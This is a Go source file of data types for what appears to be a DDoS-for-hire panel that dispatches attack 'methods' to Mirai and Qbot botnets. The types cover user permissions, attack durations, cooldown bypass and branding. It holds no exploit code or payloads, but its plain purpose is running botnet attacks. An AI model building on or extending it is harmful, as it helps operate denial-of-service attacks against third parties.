package models 


//stores the method information
//the method names will be the key inside the map
type Method struct { //stored in type structure
	Enabled		  bool     		  `json:"enabled"`
	Description   string   		  `json:"description"`
	Permissions   []string 		  `json:"permissions"`
	Target        RequestLaunched `json:"target"`
	Options       *Options 		  `json:"options"`
}

//stores the mirai method information properly
//this will ensure its done without any errors
type MiraiMethod struct { //stored in type structure
	Enabled		  bool     		  `json:"enabled"`
	Description   string   		  `json:"description"`
	Permissions   []string 		  `json:"permissions"`
	Options       *Options 		  `json:"options"`
	MethodID      int             `json:"id"`
	PortFlagID    int             `json:"port"`
}

//stores the qbot method information properly
//this will ensure its done without any errors
type QbotMethod struct { //stored in type structure
	Enabled		  bool     		  `json:"enabled"`
	Description   string   		  `json:"description"`
	Permissions   []string 		  `json:"permissions"`
	Options       *Options 		  `json:"options"`
	Args		  []string		  `json:"args"`
}

type Options struct {
	Group			string 			`json:"group"`
	Spinner         string 			`json:"spinner"`
	MaxTimeOverride int    			`json:"maxtime_override"`
	EnMaxtime       int    			`json:"enhanced_maxtime"`
	DefaultDuration int    			`json:"default_duration"`
	DefaultPort     int    			`json:"default_port"`
	GlobalPerUser   int    			`json:"global_user_limit"`
	AttackBranding  string 			`json:"attack_launched_branding"`
	CanAPIMethod	bool   			`json:"api_method"`
	CooldownBypass  bool   			`json:"bypass_cooldown"`
	GlobalPowersave bool   			`json:"global_powersaving"`
	KeyValues  map[string]*KeyValue `json:"keyvalues"`
	Routes        []string          `json:"routes"`
}

type KeyValue struct {
	Type       string 			 `json:"type"`
	Forced     bool   			 `json:"forced"`
	Default    string 			 `json:"default"`
	MaxLength  int    			 `json:"max_length"`
	MaxIntSize int    			 `json:"max_int_size"`
	Views      map[string]string `json:"views"`
	ID         int               `json:"id"` //mirai mainly
}

type RequestLaunched struct {
	Method       string   `json:"method"`
	URL          []string `json:"url"`
	MinSuccess	 int	  `json:"minimumSuccess"`
	PathEncoding bool     `json:"PathEncoding"`
}